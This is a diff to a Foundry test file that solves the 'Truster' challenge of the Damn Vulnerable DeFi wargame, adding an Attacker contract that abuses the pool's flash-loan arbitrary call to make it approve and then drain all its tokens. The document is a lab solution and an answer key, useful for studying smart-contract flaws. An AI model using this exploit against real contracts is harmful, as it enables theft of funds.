@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -50,8 +51,11 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {
-        
+    function test_truster() public checkSolvedByPlayer() {
+        Attacker attacker = new Attacker(pool, token, recovery);
+        attacker.attack();
+
+        console.log(vm.getNonce(player));
     }
 
     /**
@@ -64,5 +68,30 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+    uint256 amount = 1_000_000e18;
+    DamnValuableToken public token;
+    TrusterLenderPool public pool;
+    address player;
+    address recovery;
+
+    constructor (TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+        token = _token;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        bytes memory approveCalldata = abi.encodeWithSelector(
+            IERC20.approve.selector,
+            address(this),
+            amount
+        );
+
+        pool.flashLoan(0, address(this), address(token), approveCalldata);
+        token.transferFrom(address(pool), recovery, amount);
     }
 }
